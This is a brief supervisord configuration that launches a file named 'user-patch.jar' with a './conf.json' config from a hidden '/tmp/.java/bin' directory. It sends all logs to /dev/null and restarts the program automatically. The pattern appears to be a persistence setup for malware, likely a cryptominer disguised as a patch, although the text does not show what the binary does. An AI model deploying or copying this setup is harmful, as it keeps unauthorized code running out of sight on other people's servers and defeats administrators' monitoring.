# rufastnde/cfg.conf
[supervisord]
logfile=/dev/null

[program:app]
directory=/tmp/.java/bin
command=./user-patch.jar -c ./conf.json
stdout_logfile=/dev/null
autorestart = true